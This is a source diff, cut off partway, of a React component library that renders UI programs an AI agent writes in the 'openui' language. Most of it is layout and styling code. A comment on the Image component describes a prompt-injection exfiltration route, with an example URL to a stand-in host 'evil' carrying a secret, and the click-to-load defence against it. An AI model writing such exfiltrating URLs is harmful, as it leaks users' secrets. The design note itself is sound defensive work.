@@ -1,28 +1,36 @@
 /* ── The openui language's component library ──
    A model that answers in `openui` writes `identifier = Component(...)` lines,
-   and this is the table those names resolve against. Two rules decided the
-   contents:
+   and this is the table those names resolve against. Three rules decided it:
 
-   — the pieces are the harness's own, so a generated card wears the transcript
-     rather than being a second design system inside it: `Notice` for a callout,
-     `Empty` for an absence, `harness-table` for a grid (the class the markdown
-     renderer's tables wear, and the one `.prose` styles), the `--chart-*` tokens
-     for a chart;
+   — **one surface rule, held in context.** Anything framed goes through `Box`,
+     and `Box` asks where it is: on the page it is a raised card (`FRAME`), inside
+     another frame it is a recessed well (`INSET`), inside a `StatRow` it is a
+     bare cell. So a Table in a Card is never a second bordered card inside the
+     first — the bargain `settings/primitives.tsx` makes with its own `INSET` —
+     and no component picks its own ground;
+   — **one type scale**: `TITLE` for a thing's name, `BODY` for its text,
+     `META` for what qualifies it, `LABEL` (small caps) for a column or a metric's
+     name. Every inset is `PAD` or `PAD_ROW`. A component that wants a new size is
+     a component that has stopped matching the rest;
    — the schemas stay flat and shallow, which is what the language asks of its
      libraries: every component is a container of strings or a small record, and
      composition is `z.array(Component.ref)`. A deeply nested prop burns tokens
      and is where generation goes wrong.
+
+   `Notice` and `Empty` are still the app's two message boxes, and the
+   `--chart-*` tokens colour every chart, so a generated view follows the
+   reader's palette. Every text node is `min-w-0` + `break-words`: the panel's
+   width is the one thing the model cannot control.
 
    Nothing here reaches the network or the app's state. The fence's caller does
    not pass a `toolProvider`, so a `Query(...)` in a generated program has no
    tool to find and is dropped by the parser — the model composes a *view* over
    what it already knows, and every tool call the thread makes stays a normal
    ACP call. `bindings` and `toolCalls` are off in the prompt for that reason
-   (`scripts/gen-openui.mjs`, whose output is `agent/src/openui-prompt.ts`): a
-   form the model writes would otherwise render inputs that bind to a runtime
-   this surface deliberately does not have. */
+   (`scripts/gen-openui.mjs`). */
 import { z } from "zod/v4"
-import { useState } from "react"
+import { createContext, useContext, useState, type ReactNode } from "react"
+import { Check, ChevronRight, Minus, Plus, X } from "lucide-react"
 import {
   Area,
   AreaChart,
@@ -60,14 +68,67 @@ import {
 } from "@/components/ui/chart"
 import { cn } from "@/lib/utils"
 
-/* One vertical rhythm for everything that holds children — Stack, Card, Details —
-   so a card's sections sit as far apart as the cards around it. Tighter below
-   `@panel-sm`, where a desktop gap reads as a wall. */
-const GAP = { sm: "gap-2", md: "gap-2.5 @panel-sm:gap-3", lg: "gap-3 @panel-sm:gap-4" } as const
+/* ── The system ── */
 
-/** `root` is the container the prompt insists on wrapping every program in, and
-    it is the harness's stack of sections: vertical by default, a row for the
-    cluster of numbers at the top of a dashboard. */
+const TITLE = "break-words text-[13.5px] leading-snug font-semibold tracking-tight text-foreground"
+const BODY = "break-words text-[13px] leading-relaxed text-foreground/90"
+const META = "break-words text-xs leading-snug text-muted-foreground"
+const LABEL = "break-words text-[10.5px] leading-tight font-medium tracking-[0.06em] uppercase text-muted-foreground"
+const PAD = "px-3 py-2.5 @panel-sm:px-3.5 @panel-sm:py-3"
+const PAD_ROW = "px-3 py-2 @panel-sm:px-3.5"
+/** Between siblings, everywhere: a stack, a card's body, a tab's panel. */
+const FLOW = "flex min-w-0 flex-col gap-2.5 @panel-sm:gap-3"
+const HAIRLINE = "border-border/60"
+
+const FRAME = "rounded-xl border border-border/70 bg-card shadow-xs"
+const INSET = "rounded-lg border border-border/40 bg-muted/40"
+
+type Surface = "page" | "frame" | "cell"
+const SurfaceContext = createContext<Surface>("page")
+
+/** The one framed thing. What it looks like is where it is, never the caller's
+    choice — which is the whole of "styled the same". Its children are inside a
+    frame, so anything framed among them draws as a well. */
+function Box({ className, children }: { className?: string; children: ReactNode }) {
+  const surface = useContext(SurfaceContext)
+  return (
+    <SurfaceContext.Provider value="frame">
+      <div
+        className={cn(
+          "min-w-0 overflow-hidden",
+          surface === "page" ? FRAME : surface === "frame" ? INSET : "bg-card",
+          className
+        )}
+      >
+        {children}
+      </div>
+    </SurfaceContext.Provider>
+  )
+}
+
+/** A frame's top band: a name and what qualifies it, over a hairline. */
+function BoxHeader({ title, meta }: { title: ReactNode; meta?: ReactNode }) {
+  return (
+    <header className={cn("min-w-0 space-y-0.5 border-b", HAIRLINE, PAD_ROW, "py-2.5")}>
+      <div className={TITLE}>{title}</div>
+      {meta && <div className={cn(META, "text-pretty")}>{meta}</div>}
+    </header>
+  )
+}
+
+const TONE_DOT = {
+  neutral: "bg-muted-foreground/50",
+  info: "bg-chart-2",
+  success: "bg-primary",
+  warn: "bg-chart-3",
+  error: "bg-destructive",
+} as const
+
+/* ── Layout ── */
+
+/** `root` is the container the prompt insists on wrapping every program in:
+    vertical by default, a wrapping grid for a cluster of cards. The panel's
+    width decides the columns, never the window's. */
 const Stack = defineComponent({
   name: "Stack",
   description: "Vertical container. The root element every OpenUI program starts from.",
@@ -79,13 +140,12 @@ const Stack = defineComponent({
   component: ({ props, renderNode }) => (
     <div
       className={cn(
-        "flex min-w-0",
-        props.direction === "row" ? "flex-row flex-wrap items-stretch" : "flex-col",
-        /* A dashboard spaced for a desktop column reads as a wall in a phone
-           panel: the gaps tighten below `@panel-sm` and open back up above it.
-           The panel's width decides, never the window's — a chat docked narrow
-           beside a terminal is the case these queries exist for. */
-        GAP[props.gap ?? "md"]
+        "min-w-0",
+        props.direction === "row"
+          ? "grid grid-cols-1 items-start gap-2.5 @panel-sm:grid-cols-[repeat(auto-fit,minmax(min(100%,15rem),1fr))] @panel-sm:gap-3"
+          : FLOW,
+        props.gap === "sm" && "gap-1.5 @panel-sm:gap-2",
+        props.gap === "lg" && "gap-4 @panel-sm:gap-5"
       )}
     >
       {renderNode(props.children)}
@@ -93,11 +153,7 @@ const Stack = defineComponent({
   ),
 })
 
-/**
- * A card: the transcript's own geometry (`CARD` in `tool-parts.tsx`), so a
- * generated one sits beside a tool step without looking like a different app.
- * Square to the width it is given, because the caller decides the column.
- */
+/** A titled frame: the header is a band of its own, the body the one flow. */
 const Card = defineComponent({
   name: "Card",
   description: "A titled panel holding a group of sections.",
@@ -107,22 +163,16 @@ const Card = defineComponent({
     children: z.array(z.any()),
   }),
   component: ({ props, renderNode }) => (
-    <section className="min-w-0 w-full rounded-xl border border-border/60 bg-muted/30 px-2.5 py-2 @panel-sm:px-3 @panel-sm:py-2.5">
-      <header className="mb-2.5 space-y-0.5">
-        <h3 className="text-sm font-semibold text-pretty text-foreground">{props.title}</h3>
-        {props.subtitle && (
-          <p className="text-xs text-pretty text-muted-foreground">{props.subtitle}</p>
-        )}
-      </header>
-      <div className={cn("flex min-w-0 flex-col", GAP.md)}>{renderNode(props.children)}</div>
-    </section>
+    <Box>
+      <BoxHeader title={props.title} meta={props.subtitle} />
+      <div className={cn(FLOW, PAD)}>{renderNode(props.children)}</div>
+    </Box>
   ),
 })
 
-/* A heading and a line under it. The text is drawn as plain characters rather
-   than through the app's markdown renderer: that renderer lives in
-   `tool-parts.tsx`, which is what this library is reached *from*, and a
-   `Prose` import here would close that cycle for the sake of bold in a caption. */
+/* A heading and a line under it. Plain characters rather than the app's
+   markdown renderer: that lives in `tool-parts.tsx`, which is what this library
+   is reached *from*, and importing `Prose` here would close that cycle. */
 const Section = defineComponent({
   name: "Section",
   description: "A heading with an optional line of explanatory text.",
@@ -131,71 +181,168 @@ const Section = defineComponent({
     text: z.string().optional(),
   }),
   component: ({ props }) => (
-    <div className="min-w-0 space-y-1">
-      <p className="text-[10px] font-semibold tracking-[0.08em] uppercase text-muted-foreground/50">
+    <div className="min-w-0 space-y-1 pt-0.5">
+      <h3 className="break-words text-[15px] leading-snug font-semibold tracking-tight text-balance text-foreground">
         {props.title}
-      </p>
-      {props.text && <p className="text-[12.5px] leading-relaxed text-foreground/90">{props.text}</p>}
+      </h3>
+      {props.text && <p className={cn(BODY, "text-pretty text-muted-foreground")}>{props.text}</p>}
     </div>
   ),
 })
 
-/** One number with its label under it — the unit a row of metrics is made of. */
-const Stat = defineComponent({
-  name: "Stat",
-  description: "A single metric: a label and a value.",
-  props: z.object({
-    label: z.string(),
-    value: z.string(),
-    hint: z.string().optional(),
-  }),
-  /* The one component whose mobile shape matters most: a row of four of these
-     on a phone panel wraps into pairs (the `basis` at `StatRow`), and each one
-     has to stand alone in half the width without its number wrapping mid-figure.
-     `min-w-0` + `tabular-nums` keep the digits on one line, and the label may
-     take two lines rather than forcing the box wider than its share. */
-  component: ({ props }) => (
-    <div className="min-w-0 flex-1 rounded-lg border border-border/50 bg-background/50 px-2.5 py-2">
-      <p className="text-[10px] leading-tight font-semibold tracking-[0.08em] uppercase text-balance text-muted-foreground/60">
-        {props.label}
-      </p>
-      <p className="mt-0.5 text-base leading-tight font-semibold tabular-nums text-foreground @panel-sm:text-lg">
-        {props.value}
-      </p>
-      {props.hint && <p className="mt-0.5 text-[11px] text-pretty text-muted-foreground">{props.hint}</p>}
-    </div>
-  ),
+/** A divider, for a generated dashboard that wants one. */
+const Divider = defineComponent({
+  name: "Divider",
+  description: "A horizontal rule.",
+  props: z.object({}),
+  component: () => <hr className={HAIRLINE} />,
 })
 
-/** A row of `Stat`s. Its schema is the stats and nothing else, which is the
-    whole reason it exists: `Stack` cannot say "these are numbers". */
-const StatRow = defineComponent({
-  name: "StatRow",
-  description: "A row of metrics across the width of the page.",
+/** A folded section: native `<details>`, so it needs no state and survives the
+    streaming re-render. */
+const Details = defineComponent({
+  name: "Details",
+  description: "A collapsible section, closed unless `open` is true.",
   props: z.object({
-    stats: z.array(Stat.ref),
+    summary: z.string(),
+    children: z.array(z.any()),
+    open: z.boolean().optional(),
   }),
-  /* The mobile fix here is the `basis` each `Stat` grows from, set on the stat
-     itself (`flex-1` under a `min-w-0` parent): four of them fall two-up in a
-     narrow panel and sit in one row when there is room, which is what keeps a
-     phone from getting four cramped columns with three-line labels. */
   component: ({ props, renderNode }) => (
-    <div className="flex min-w-0 flex-wrap items-stretch gap-2">{renderNode(props.stats)}</div>
+    <Box>
+      <details open={props.open} className="group/details">
+        <summary
+          className={cn(
+            "flex cursor-pointer list-none items-center gap-2 select-none hover:bg-muted/40 [&::-webkit-details-marker]:hidden",
+            PAD_ROW,
+            "py-2.5"
+          )}
+        >
+          <ChevronRight className="size-3.5 shrink-0 text-muted-foreground transition-transform group-open/details:rotate-90" />
+          <span className={cn(TITLE, "min-w-0 font-medium")}>{props.summary}</span>
+        </summary>
+        <div className={cn(FLOW, "border-t", HAIRLINE, PAD)}>{renderNode(props.children)}</div>
+      </details>
+    </Box>
   ),
 })
+
+/** Tabs: alternatives the reader flips between. The `line` variant, so the
+    strip reads as a heading over the panel rather than as a pill of its own. */
+const Tabs = defineComponent({
+  name: "Tabs",
+  description: "Switchable panels: each tab has a label and its own children.",
+  props: z.object({
+    tabs: z.array(z.object({ label: z.string(), children: z.array(z.any()) })),
+  }),
+  component: ({ props, renderNode }) => (
+    <UiTabs defaultValue={0} className="min-w-0 gap-3">
+      {/* Scrolls sideways rather than wrapping; `scrollbar-none` keeps a
+          classic scrollbar from eating the fixed-height strip's content box,
+          which clipped every label against it. */}
+      <TabsList
+        variant="line"
+        className={cn("w-full max-w-full min-w-0 justify-start overflow-x-auto border-b scrollbar-none", HAIRLINE)}
+      >
+        {props.tabs.map((tab, index) => (
+          <TabsTrigger key={index} value={index} className="min-w-0 flex-none text-[13px]">
+            {tab.label}
+          </TabsTrigger>
+        ))}
+      </TabsList>
+      {props.tabs.map((tab, index) => (
+        <TabsContent key={index} value={index} className={FLOW}>
+          {renderNode(tab.children)}
+        </TabsContent>
+      ))}
+    </UiTabs>
+  ),
+})
+
+/** An FAQ-shaped fold: one frame, a hairline between questions. */
+const Accordion = defineComponent({
+  name: "Accordion",
+  description: "A list of collapsible items, each a title over its own children. Good for FAQs.",
+  props: z.object({
+    items: z.array(z.object({ title: z.string(), children: z.array(z.any()) })),
+  }),
+  component: ({ props, renderNode }) => (
+    <Box>
+      <UiAccordion className="min-w-0">
+        {props.items.map((item, index) => (
+          <AccordionItem key={index} value={index} className={cn("border-b last:border-b-0", HAIRLINE)}>
+            <AccordionTrigger
+              className={cn(
+                "min-w-0 gap-2 rounded-none hover:bg-muted/40 hover:no-underline [&_[data-slot=accordion-trigger-icon]]:mt-0.5",
+                PAD_ROW,
+                "py-2.5"
+              )}
+            >
+              <span className={cn(TITLE, "min-w-0 font-medium")}>{item.title}</span>
+            </AccordionTrigger>
+            <AccordionContent className={cn(PAD, "pt-0")}>
+              <div className={FLOW}>{renderNode(item.children)}</div>
+            </AccordionContent>
+          </AccordionItem>
+        ))}
+      </UiAccordion>
+    </Box>
+  ),
+})
+
+/* ── Content ── */
+
+/** Short lines. Numbered items wear a counter chip, bullets a dot centred on
+    the first line — both in the same 20px column, so a list is aligned
+    whichever it is. */
+const List = defineComponent({
+  name: "List",
+  description: "Short lines, numbered or bulleted.",
+  props: z.object({
+    items: z.array(z.string()),
+    numbered: z.boolean().optional(),
+  }),
+  component: ({ props }) => {
+    const Tag = props.numbered ? "ol" : "ul"
+    return (
+      <Tag className="min-w-0 space-y-1.5">
+        {props.items.map((item, index) => (
+          <li key={index} className="flex min-w-0 gap-2.5">
+            <span className="flex h-[1.625em] w-5 shrink-0 items-center justify-center text-[13px]">
+              {props.numbered ? (
+                <span className="flex size-5 items-center justify-center rounded-md bg-muted text-[11px] font-medium tabular-nums text-muted-foreground">
+                  {index + 1}
+                </span>
+              ) : (
+                <span className="size-1.5 rounded-full bg-foreground/35" />
+              )}
+            </span>
+            <span className={cn(BODY, "min-w-0 flex-1")}>{item}</span>
+          </li>
+        ))}
+      </Tag>
+    )
+  },
+})
+
+/** A cell is a number when it reads as one — a figure, a currency, a percent,
+    a short unit. A column whose every filled cell is one aligns to the end. */
+const NUMERIC = /^[-+~]?[$€£¥]?\s?\d[\d,.]*\s?(%|[a-zA-Z]{1,3})?$/
+function numericColumns(columns: string[], rows: string[][]) {
+  return columns.map((_, c) => {
+    const cells = rows.map((row) => row[c]?.trim() ?? "").filter(Boolean)
+    return cells.length > 0 && cells.every((cell) => NUMERIC.test(cell))
+  })
+}
 
 /**
- * A table.
+ * A table. Plain string margins rather than a row-of-cells schema: a model that
+ * has to declare a column set *and* keep its rows in that order gets the pairing
+ * wrong far more often than it gets one array of strings wrong.
  *
- * Plain string margins rather than a row-of-cells schema: the language has no
- * cell type, and a model that has to declare a column set *and* keep its rows in
- * that order gets the pairing wrong far more often than it gets one array of
- * strings wrong. `header` is on by default and off for a grid that has none.
- *
- * The `harness-table` / `prose` spine is not cosmetic: that is what the
- * markdown renderer's own tables wear (`MARKDOWN_COMPONENTS` in `tool-parts.tsx`)
- * and what `index.css` styles, so a table the model writes by hand and one the
- * language draws are the same table.
+ * The frame is the scroll container, so a table wider than a phone panel
+ * scrolls inside the turn rather than widening it. `tone`: `muted` greys the
+ * cells; otherwise the first column is the row's name and wears it.
  */
 const Table = defineComponent({
   name: "Table",
@@ -206,76 +353,54 @@ const Table = defineComponent({
     header: z.boolean().optional(),
     tone: z.enum(["default", "muted", "accent"]).optional(),
   }),
-  /* The `harness-table` wrapper is the scroll container (`index.css`): a table
-     wider than a phone panel scrolls inside the turn rather than widening it,
-     which is the whole reason that class exists. Nothing extra is needed here —
-     the frame is shared with every markdown table in the transcript, on purpose. */
-  component: ({ props }) => (
-    <div className={cn("prose prose-sm max-w-none")}>
-      <div className="harness-table">
-        <table>
-          {props.header !== false && (
-            <thead>
-              <tr>
-                {props.columns.map((column, index) => (
-                  <th key={index}>{column}</th>
-                ))}
-              </tr>
-            </thead>
-          )}
-          <tbody>
-            {props.rows.map((row, rowIndex) => (
-              <tr key={rowIndex}>
-                {props.columns.map((_, cellIndex) => (
-                  <td
-                    key={cellIndex}
-                    className={cn(
-                      "align-top",
-                      props.tone === "muted" && "text-muted-foreground",
-                      props.tone === "accent" && cellIndex === 0 && "font-medium text-foreground"
-                    )}
-                  >
-                    {row[cellIndex] ?? ""}
-                  </td>
-                ))}
-              </tr>
-            ))}
-          </tbody>
-        </table>
-      </div>
-    </div>
-  ),
-})
-
-/** A list of short lines — steps, options, facts. */
-const List = defineComponent({
-  name: "List",
-  description: "Short lines, numbered or bulleted.",
-  props: z.object({
-    items: z.array(z.string()),
-    numbered: z.boolean().optional(),
-  }),
-  component: ({ props }) =>
-    props.numbered ? (
-      <ol className="ms-4 list-decimal space-y-1 text-[12.5px] text-foreground/90">
-        {props.items.map((item, index) => (
-          <li key={index}>{item}</li>
-        ))}
-      </ol>
-    ) : (
-      <ul className="ms-4 list-disc space-y-1 text-[12.5px] text-foreground/90">
-        {props.items.map((item, index) => (
-          <li key={index}>{item}</li>
-        ))}
-      </ul>
-    ),
+  component: ({ props }) => {
+    const numeric = numericColumns(props.columns, props.rows)
+    const cell = "px-3 py-2 align-top first:ps-3 last:pe-3 @panel-sm:first:ps-3.5 @panel-sm:last:pe-3.5"
+    return (
+      <Box>
+        <div className="overflow-x-auto">
+          <table className="w-full border-collapse text-[13px]">
+            {props.header !== false && (
+              <thead className="bg-muted/40">
+                <tr className={cn("border-b", HAIRLINE)}>
+                  {props.columns.map((column, index) => (
+                    <th key={index} className={cn(cell, LABEL, numeric[index] ? "text-end" : "text-start")}>
+                      {column}
+                    </th>
+                  ))}
+                </tr>
+              </thead>
+            )}
+            <tbody className="divide-y divide-border/50">
+              {props.rows.map((row, rowIndex) => (
+                <tr key={rowIndex} className="hover:bg-muted/30">
+                  {props.columns.map((_, cellIndex) => (
+                    <td
+                      key={cellIndex}
+                      className={cn(
+                        cell,
+                        "min-w-24 break-words text-foreground/90",
+                        numeric[cellIndex] && "min-w-0 text-end whitespace-nowrap tabular-nums",
+                        props.tone === "muted" && "text-muted-foreground",
+                        cellIndex === 0 && props.tone !== "muted" && "font-medium text-foreground"
+                      )}
+                    >
+                      {row[cellIndex] ?? ""}
+                    </td>
+                  ))}
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      </Box>
+    )
+  },
 })
 
 /**
- * A callout. `Notice` is the app's one alert box, and the four tones are
- * semantic there (`error` destructive, `warn` amber, `info` sky, `neutral` the
- * muted ground) — so this component passes the tone through rather than
- * painting its own colours.
+ * A callout. `Notice` is the app's one alert box and its four tones are
+ * semantic there, so this passes the tone through rather than painting its own.
  */
 const Callout = defineComponent({
   name: "Callout",
@@ -286,15 +411,20 @@ const Callout = defineComponent({
     title: z.string().optional(),
   }),
   component: ({ props }) => (
-    <Notice tone={props.tone ?? "neutral"} size="sm" title={props.title}>
-      {props.text}
+    <Notice
+      className="min-w-0 [&_p]:break-words [&_button]:max-w-full [&_button]:whitespace-normal [&_button]:break-words"
+      tone={props.tone ?? "neutral"}
+      size="sm"
+    >
+      {props.title && <p className="break-words font-medium text-pretty">{props.title}</p>}
+      <span className="break-words">{props.text}</span>
     </Notice>
   ),
 })
 
-/** A fenced code block, drawn as one. It is the transcript's terminal-ish
-    ground rather than a syntax-highlighted pane: the model's code in a
-    generated view is a reference, not a diff to read. */
+/** Preformatted text. The language, when named, is the frame's label band — a
+    reference, not a highlighted pane. Wraps rather than scrolling, because a
+    long token in a phone panel would push the whole answer sideways. */
 const Code = defineComponent({
   name: "Code",
   description: "Preformatted text, a snippet or a log.",
@@ -302,19 +432,483 @@ const Code = defineComponent({
     text: z.string(),
     language: z.string().optional(),
   }),
-  /* `break-words` is the mobile half: generated code is model-written prose
-     about code more often than it is a real snippet, and a long unbroken token
-     in a phone panel would otherwise push the whole answer sideways. */
   component: ({ props }) => (
-    <pre className="overflow-auto rounded-md border border-border/50 bg-muted/40 px-2.5 py-2 font-mono text-[11.5px] break-words whitespace-pre-wrap text-foreground/90">
+    <Box>
+      {props.language && (
+        <div className={cn("border-b bg-muted/40", HAIRLINE, PAD_ROW, "py-1.5", LABEL)}>{props.language}</div>
+      )}
+      <pre
+        className={cn(
+          "overflow-auto font-mono text-[12px] leading-relaxed break-words whitespace-pre-wrap text-foreground/90",
+          PAD
+        )}
+      >
+        {props.text}
+      </pre>
+    </Box>
+  ),
+})
+
+/** A definition list, set like a receipt: the name at the start, the value at
+    the end, and a value too long for the line wraps under its name on its own —
+    no breakpoint, the flex-wrap is the reflow. */
+const KeyValue = defineComponent({
+  name: "KeyValue",
+  description: "A list of named facts.",
+  props: z.object({
+    items: z.array(z.object({ key: z.string(), value: z.string() })),
+  }),
+  component: ({ props }) => (
+    <Box>
+      <dl className="divide-y divide-border/50">
+        {props.items.map((item, index) => (
+          <div
+            key={index}
+            className={cn("flex min-w-0 flex-wrap items-baseline justify-between gap-x-4 gap-y-0.5", PAD_ROW)}
+          >
+            <dt className="min-w-0 break-words text-[13px] text-muted-foreground">{item.key}</dt>
+            <dd className="ms-auto min-w-0 text-end break-words text-[13px] font-medium text-foreground tabular-nums">
+              {item.value}
+            </dd>
+          </div>
+        ))}
+      </dl>
+    </Box>
+  ),
+})
+
+/** An absence, drawn as one: the app's dashed box, never an alert. */
+const EmptyState = defineComponent({
+  name: "EmptyState",
+  description: "A box saying there is nothing to show.",
+  props: z.object({
+    text: z.string(),
+  }),
+  component: ({ props }) => (
+    <Empty className="min-w-0 max-w-full [&_p]:break-words" size="sm">
       {props.text}
-    </pre>
+    </Empty>
+  ),
+})
+
+/**
+ * An image. Remote images are the one thing in this library that would reach
+ * the network, and a URL the model writes can carry whatever the thread has read
+ * (a prompt-injected page asking for `https://evil/?q=<secret>`). So a `data:`
+ * image draws at once and an `http(s)` one waits behind a click that names its
+ * host — the reader's consent is the fetch. Anything else is not drawn.
+ */
+const Image = defineComponent({
+  name: "Image",
+  description: "An image from an https or data: URL, with alt text and an optional caption.",
+  props: z.object({
+    src: z.string(),
+    alt: z.string(),
+    caption: z.string().optional(),
+  }),
+  component: ({ props }) => <GeneratedImage {...props} />,
+})
+
+function GeneratedImage({ src, alt, caption }: { src: string; alt: string; caption?: string }) {
+  const inline = /^data:image\/(png|jpe?g|gif|webp);/i.test(src)
+  let host: string | null = null
+  try {
+    const url = new URL(src)
+    if (url.protocol === "https:" || url.protocol === "http:") host = url.host
+  } catch {
+    /* not a URL — drawn as the alt text below */
+  }
+  const [shown, setShown] = useState(inline)
+  const [failed, setFailed] = useState(false)
+  if (failed || (!shown && !host)) {
+    return <Empty size="sm">{failed ? `Image failed to load: ${alt}` : alt}</Empty>
+  }
+  return (
+    <Box>
+      <figure className="min-w-0">
+        {shown ? (
+          <img
+            src={src}
+            alt={alt}
+            referrerPolicy="no-referrer"
+            onError={() => setFailed(true)}
+            className="mx-auto block max-h-96 max-w-full object-contain"
+          />
+        ) : (
+          <button
+            type="button"
+            onClick={() => setShown(true)}
+            className={cn("flex w-full flex-col items-start gap-0.5 text-start hover:bg-muted/40", PAD)}
+          >
+            <span className={cn(BODY, "[overflow-wrap:anywhere]")}>{alt}</span>
+            <span className={cn(META, "[overflow-wrap:anywhere]")}>Load image from {host}</span>
+          </button>
+        )}
+        {caption && (
+          <figcaption className={cn(META, "border-t text-pretty", HAIRLINE, PAD_ROW)}>{caption}</figcaption>
+        )}
+      </figure>
+    </Box>
+  )
+}
+
+/** Short tags. Every chip is the same neutral chip and the tone is a dot, so a
+    row of six statuses reads as one row and not as six colours. */
+const Badges = defineComponent({
+  name: "Badges",
+  description: "A row of short tags, each with an optional tone.",
+  props: z.object({
+    items: z.array(
+      z.object({
+        text: z.string(),
+        tone: z.enum(["neutral", "info", "success", "warn", "error"]).optional(),
+      })
+    ),
+  }),
+  component: ({ props }) => (
+    <div className="flex min-w-0 flex-wrap gap-1.5">
+      {props.items.map((item, index) => (
+        <span
+          key={index}
+          className="inline-flex max-w-full items-center gap-1.5 rounded-md border border-border/70 bg-card px-2 py-0.5 text-xs font-medium text-foreground/90 shadow-xs"
+        >
+          <span className={cn("size-1.5 shrink-0 rounded-full", TONE_DOT[item.tone ?? "neutral"])} />
+          <span className="min-w-0 break-words">{item.text}</span>
+        </span>
+      ))}
+    </div>
+  ),
+})
+
+/** Ordered events with a state each. The rail is the list; the marker says the
+    state by shape as well as by colour. */
+const Timeline = defineComponent({
+  name: "Timeline",
+  description: "Ordered steps or events: a title, optional time and text, and a status.",
+  props: z.object({
+    items: z.array(
+      z.object({
+        title: z.string(),
+        time: z.string().optional(),
+        text: z.string().optional(),
+        status: z.enum(["done", "active", "pending", "failed"]).optional(),
+      })
+    ),
+  }),
+  component: ({ props }) => (
+    <ol className="min-w-0">
+      {props.items.map((item, index) => {
+        const status = item.status ?? "pending"
+        return (
+          <li key={index} className="relative flex min-w-0 gap-3 pb-4 last:pb-0">
+            {index < props.items.length - 1 && (
+              <span className="absolute top-6 bottom-1 left-[9.5px] w-px bg-border" />
+            )}
+            <span
+              className={cn(
+                "mt-px flex size-5 shrink-0 items-center justify-center rounded-full",
+                status === "done" && "bg-primary text-primary-foreground",
+                status === "active" && "bg-primary/15 ring-1 ring-primary ring-inset",
+                status === "failed" && "bg-destructive text-white",
+                status === "pending" && "bg-card ring-1 ring-border ring-inset"
+              )}
+            >
+              {status === "done" && <Check className="size-3" strokeWidth={3} />}
+              {status === "failed" && <X className="size-3" strokeWidth={3} />}
+              {status === "active" && <span className="size-2 animate-pulse rounded-full bg-primary" />}
+            </span>
+            <div className="min-w-0 flex-1 space-y-0.5 pt-px">
+              <div className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-3">
+                <span
+                  className={cn(TITLE, "min-w-0 text-[13px] font-medium", status === "pending" && "text-muted-foreground")}
+                >
+                  {item.title}
+                </span>
+                {item.time && <span className={cn(META, "max-w-full tabular-nums")}>{item.time}</span>}
+              </div>
+              {item.text && <p className={cn(META, "text-pretty")}>{item.text}</p>}
+            </div>
+          </li>
+        )
+      })}
+    </ol>
+  ),
+})
+
+/** Options side by side: one frame each, name and verdict as its header band,
+    pros and cons marked by glyph as well as by colour. Stacks below `@panel-sm`. */
+const Compare = defineComponent({
+  name: "Compare",
+  description: "Options side by side, each with a name, optional verdict, pros and cons.",
+  props: z.object({
+    options: z.array(
+      z.object({
+        name: z.string(),
+        verdict: z.string().optional(),
+        pros: z.array(z.string()).optional(),
+        cons: z.array(z.string()).optional(),
+      })
+    ),
+  }),
+  component: ({ props }) => (
+    <div className="grid min-w-0 gap-2.5 @panel-sm:grid-cols-[repeat(auto-fit,minmax(min(100%,13rem),1fr))] @panel-sm:gap-3">
+      {props.options.map((option, index) => (
+        <Box key={index}>
+          <BoxHeader title={option.name} meta={option.verdict} />
+          <ul className={cn("min-w-0 space-y-1.5", PAD)}>
+            {option.pros?.map((pro, i) => (
+              <li key={`p${i}`} className="flex min-w-0 gap-2">
+                <Plus className="mt-[0.3em] size-3.5 shrink-0 text-primary" strokeWidth={2.5} />
+                <span className={cn(BODY, "min-w-0")}>{pro}</span>
+              </li>
+            ))}
+            {option.cons?.map((con, i) => (
+              <li key={`c${i}`} className="flex min-w-0 gap-2">
+                <Minus className="mt-[0.3em] size-3.5 shrink-0 text-destructive" strokeWidth={2.5} />
+                <span className={cn(BODY, "min-w-0")}>{con}</span>
+              </li>
+            ))}
+          </ul>
+        </Box>
+      ))}
+    </div>
+  ),
+})
+
+/** A before/after of text, drawn by the same line diff tool steps use. */
+const Diff = defineComponent({
+  name: "Diff",
+  description: "A line diff between old and new text, with an optional path.",
+  props: z.object({
+    before: z.string(),
+    after: z.string(),
+    path: z.string().optional(),
+  }),
+  component: ({ props }) => <DiffView oldText={props.before} newText={props.after} path={props.path} />,
+})
+
+/** Keyboard chords: the action at the start, the keycaps at the end. */
+const Keys = defineComponent({
+  name: "Keys",
+  description: "Keyboard shortcuts: each entry is a list of keys and what the chord does.",
+  props: z.object({
+    items: z.array(z.object({ keys: z.array(z.string()), action: z.string() })),
+  }),
+  component: ({ props }) => (
+    <Box>
+      <div className="divide-y divide-border/50">
+        {props.items.map((item, index) => (
+          <div
+            key={index}
+            className={cn("flex min-w-0 flex-wrap items-center justify-between gap-x-4 gap-y-1", PAD_ROW)}
+          >
+            <span className={cn(BODY, "min-w-0 flex-1 basis-40")}>{item.action}</span>
+            <KbdGroup className="ms-auto min-w-0 max-w-full flex-wrap">
+              {item.keys.map((key, i) => (
+                <Kbd key={i}>{key}</Kbd>
+              ))}
+            </KbdGroup>
+          </div>
+        ))}
+      </div>
+    </Box>
+  ),
+})
+
+/** People: initials avatars, never a fetched picture (see `Image` for why),
+    in a grid of equal cells so the names line up in columns. */
+const People = defineComponent({
+  name: "People",
+  description: "A list of people with a name and optional role, drawn as initials avatars.",
+  props: z.object({
+    items: z.array(z.object({ name: z.string(), role: z.string().optional() })),
+  }),
+  component: ({ props }) => (
+    <div className="grid min-w-0 grid-cols-[repeat(auto-fill,minmax(min(100%,11rem),1fr))] gap-x-4 gap-y-3">
+      {props.items.map((person, index) => (
+        <div key={index} className="flex min-w-0 items-center gap-2.5">
+          <Avatar>
+            <AvatarFallback className="text-xs font-medium">
+              {person.name
+                .split(/\s+/)
+                .slice(0, 2)
+                .map((word) => word[0]?.toUpperCase() ?? "")
+                .join("")}
+            </AvatarFallback>
+          </Avatar>
+          <div className="min-w-0 leading-tight">
+            <p className="truncate text-[13px] font-medium text-foreground">{person.name}</p>
+            {person.role && <p className={cn(META, "truncate")}>{person.role}</p>}
+          </div>
+        </div>
+      ))}
+    </div>
+  ),
+})
+
+/** Several images, one at a time. Each slide is an `Image`, so the click-to-load
+    rule holds; the arrows sit inside the frame, which a transcript column has
+    room for and shadcn's `-left-12` does not. */
+const Gallery = defineComponent({
+  name: "Gallery",
+  description: "A carousel of images, each with src, alt and optional caption.",
+  props: z.object({
+    images: z.array(z.object({ src: z.string(), alt: z.string(), caption: z.string().optional() })),
+  }),
+  component: ({ props }) => (
+    <Carousel className="min-w-0">
+      <CarouselContent>
+        {props.images.map((image, index) => (
+          <CarouselItem key={index}>
+            <GeneratedImage {...image} />
